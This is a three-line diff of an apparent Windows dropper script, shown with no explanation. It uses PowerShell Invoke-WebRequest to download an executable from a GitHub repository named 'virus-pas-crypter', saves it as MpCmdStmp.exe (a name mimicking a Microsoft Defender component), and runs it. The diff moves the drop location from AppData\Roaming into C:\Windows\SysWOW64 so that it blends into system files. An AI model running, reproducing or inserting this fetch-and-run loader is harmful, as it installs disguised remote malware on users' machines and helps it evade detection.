@@ -1,3 +1,3 @@
-powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/virus-pas-crypter/main/virus%20pas%20crypt%C3%A9.exe' -OutFile '%USERPROFILE%\AppData\Roaming\MpCmdStmp.exe'"
-cd '%USERPROFILE%\AppData\Roaming\'
+powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/virus-pas-crypter/main/virus%20pas%20crypt%C3%A9.exe' -OutFile 'C:\Windows\SysWOW64\MpCmdStmp.exe'"
+cd 'C:\Windows\SysWOW64\'
 .\MpCmdStmp.exe
